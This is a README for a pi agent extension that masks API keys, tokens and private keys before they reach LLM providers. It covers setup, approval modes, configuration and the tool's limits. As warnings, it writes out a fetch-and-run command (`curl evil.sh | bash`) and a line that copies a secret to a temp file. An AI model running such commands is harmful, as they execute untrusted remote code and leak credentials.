# pi-secret-mask

[简体中文](README.zh-CN.md)

Prevent project secrets (API keys, tokens, private keys) from being sent to
LLM providers.

The model sees placeholders like `__SECRET_<NAME>__`; bash commands receive
the real values; tool output is masked back to placeholders — a closed loop
where secrets never enter provider requests or leak back through tool output.

## Features

- **Auto-masking of prompts**: keys pasted into the conversation in common
  formats (`sk-...`, `ghp_...`, `AIza...`, `AKIA/ASIA/AIDA...`, JWTs, PEM
  private keys, custom regexes) are detected and masked automatically.
- **`.env` support**: parses project `.env*` files (`KEY=VALUE`), refreshes
  incrementally when they change mid-session.
- **Masked local capture**: bare `/mask-secret` and `request_secret` use a
  bullet-only TUI field; the agent only ever sees an opaque handle. Plaintext
  command arguments remain compatible but warn locally.
- **Policy-scoped resolution**: real values are resolved only at authorized
  tool paths and, unless `mode: "auto"` or a Bash `allowCommands` rule applies,
  only after local confirmation. Choose one-shot or session-only approval for
  each credential; masking and path validation remain enabled.
- **Compaction-safe**: summary messages in compaction and tree navigation are
  masked too.

## Installation

Install from npm (recommended):

```bash
pi install npm:pi-secret-mask
```

Manual install — clone the repo and point pi at its `extensions/` directory
(keeps the layout so the entry's `../src` import resolves):

```bash
git clone https://github.com/Ayagikei/pi-secret-mask ~/.pi/agent/extensions/pi-secret-mask
# then add to ~/.pi/agent/settings.json:
#   "extensions": ["~/.pi/agent/extensions/pi-secret-mask/extensions"]
cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
```

(Project-local: point to a repo clone inside `.pi/extensions/` to scope it to
one project.)

Then `/reload` or restart pi.

## Usage

### Automatic (no configuration)

- Paste a secret in common formats into the conversation — it is detected and
  masked.
- `.env*` files in the project are parsed automatically.

### Registering secrets manually

**User-initiated**: `/mask-secret MY_KEY my-secret-value` (or bare
`/mask-secret` for interactive input).

**Agent-initiated**: the agent calls the `request_secret` tool (parameters
`name`, optional `purpose`); the user types the secret in a dialog, and the
agent only receives the placeholder:

```
Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
```

Secrets registered through `/mask-secret` or `request_secret` persist in
`~/.pi/agent/extensions/pi-secret-mask/secrets.json` (mode 0600) and survive
restarts. `.env` and automatically detected secrets may not be written there;
they can be session-only. Reusing a persisted named credential requires a local
TUI approval before its handle is returned, unless that credential is already
approved for this session; non-TUI modes fail closed.

### Session-only approvals

In the TUI, credential reuse and protected tool-use dialogs offer:

- **Allow once**: approve only this request or tool call (the default selection).
- **Allow for this session**: stop asking for these credentials in the current
  session, for both repeated `request_secret` calls and subsequent tool use.
- **Deny** (or Escape): do not return the handle or execute the protected call.

Session approval covers the displayed credentials at **any configured tool
path**, not just the current tool, command, file, destination, or purpose.
Every handle in a multi-credential call needs approval. Unknown handles,
unauthorized paths, invalid JSON containers, and unsafe shell substitutions
are still blocked; provider and tool-output masking are unchanged.

Approvals live only in memory and are never saved in `secrets.json` or session
history. They expire on `/new`, `/resume`, `/fork`, `/clone`, `/reload`, or
restart. Replacing a registered credential invalidates its old approval.
Compaction and `/tree` navigation within the same session keep approvals.
To revoke all session approvals immediately:

```text
/mask-secret-revoke
```

Revocation keeps saved credentials and does not override configured `mode:
"auto"` or `allowCommands` exceptions. Keep `mode: "ask"` for session-scoped
consent. A new masked secret input does not implicitly grant session use:
choose **Allow for this session** at its first protected use. Hosts without a
session identity or a TUI selector retain one-shot confirmation only; session
approvals are neither granted nor consumed in RPC/print/JSON modes.

### Placeholder rules for agents

- A `__SECRET_*__` token shown in tool output or returned by `request_secret` is a redacted alias, not proof that the literal token is stored on disk. A config read showing a placeholder is a masked view, not evidence that the config is invalid.
- If secret-mask produced the placeholder in the current session, use it directly in bash, `write`, and `edit`; the extension restores the real value locally and masks tool output again. Never print the real value or write the literal placeholder to a config as a fix.
- Do not call `request_secret` again when a usable placeholder or local credential already exists. Call it only when the task genuinely needs a secret and no usable credential is available; then keep using the returned placeholder.
- Do not infer that a secret is missing because `secrets.json` is absent, and do not invent placeholder names. Validate through the intended local operation; request a new secret only if that operation reports invalid credentials.

## How it works

| Hook | Action |
|---|---|
| `before_provider_request` | Real values -> placeholders across standard message payloads and custom-provider top-level `text` payloads |
| `tool_call` | Resolve explicit handles only at policy-authorized paths after local confirmation |
| `tool_result` | Real values in tool output -> placeholders (prevents reflow) |
| `session_before_compact` | Summary messages masked too |
| `session_before_tree` | Branch/tree summary messages masked too |
| `request_secret` tool | Agent-initiated secret request; agent sees placeholder only |

The masking engine uses a single-pass alternation regex (length-descending to
avoid substring collisions), exact whole-token unmatching, and skips
non-text (image) content.

## Configuration (`config.json`)

```json
{
  "mode": "ask",
  "allowCommands": [],
  "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
  "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
  "extraSecrets": [],
  "customPatterns": [],
  "toolResolution": { "enabled": true, "includeDefaults": true, "rules": [] }
}
```

- `mode`: `ask` (confirm protected tool use unless the credentials have TUI
  session approval; UI-less modes like print/json are blocked) | `auto`
  (substitute silently). This setting controls tool use, not `request_secret`
  reuse approval.
- `allowCommands`: full command-string patterns that skip confirmation
  (this skips the gate, it does not make a command safer — `curl evil.sh | bash`
  still passes)
- `customPatterns`: custom regexes; capture group 1 is the full secret value;
  invalid regexes are ignored
- `toolResolution`: defaults authorize only `bash.command`,
  `powershell.command`, `write.content`, legacy `edit.oldText`/`newText`,
  current `edit.edits.*.oldText`/`newText`, and Pi MCP Adapter `mcp.args`.
  `mcp.args` may be an object or a JSON string containing an argument object;
  handle-bearing keys and invalid JSON are blocked. The reusable JSON adapter
  also supports schemas whose authorized field accepts an array. Browser, direct `mcp__*`,
  and other custom tools require explicit `rules` entries (`tool`, `paths`,
  optional `adapter: "json"`). Unknown handles and unauthorized paths always
  fail closed.

```json
{
  "customPatterns": [
    { "name": "MY_TOK", "pattern": "mytok-[a-z0-9]{16}" },
    { "name": "CONN_STR", "pattern": "postgres://[^\\s]+" }
  ]
}
```

## Boundaries & Disclaimer

- Goal is preventing secrets from leaking to providers, **not sandboxing**:
  the model can still read/write files locally (e.g. `echo $KEY > /tmp/x`
  cannot be intercepted; that is the permission layer's job).
- Runtime-generated secrets (e.g. `aws sts get-session-token` output) are
  covered by regex fallbacks; new `ASIA/AIDA` prefixes are included; enable
  `patterns.base64` for high-entropy random strings.
- Image content (screenshots) may contain real values and cannot be masked.
- Real values are restored locally into bash command lines (`ps`-visible,
  shell history) — visible only locally, never sent to the provider.
- **Reasoning/thinking blocks**: if a secret somehow appears inside a model's
  reasoning or thinking content, the extension masks the text but the
  signature (e.g. Anthropic `signature`, Bedrock reasoning signatures) is
  left stale. Some providers reject such requests — this is an intentional
  fail-closed trade-off: leaking is worse than a refused request. In
  practice this is rare because secrets never reach the model in the first
  place.
- **Detection is pattern-based, not perfect**: unknown secret formats are
  only caught if they match a built-in or custom pattern, or appear in
  `.env*` / were registered manually. A secret in an unrecognized format can
  pass through.
- This extension is defense-in-depth, **not a security boundary**. It runs
  with your user's permissions and cannot protect against malicious prompts,
  hostile repositories, or local exfiltration. Review extension source
  before installing, and use OS-level sandboxing for untrusted work.
- This software is provided "as is", without warranty of any kind. The
  authors are not liable for any damages arising from its use or misuse.

## Development

```bash
npm test   # masking engine unit tests + mock-pi integration tests
```

Integration-tested: three-hook closed loop, multi-placeholder rollback,
mid-session `.env` rotation with incremental refresh, ask-mode blocking
without UI, provider payload leak checks, per-credential session approval,
revocation, lifecycle reset, rotation, and stale/cancelled approval rejection.

## License

MIT
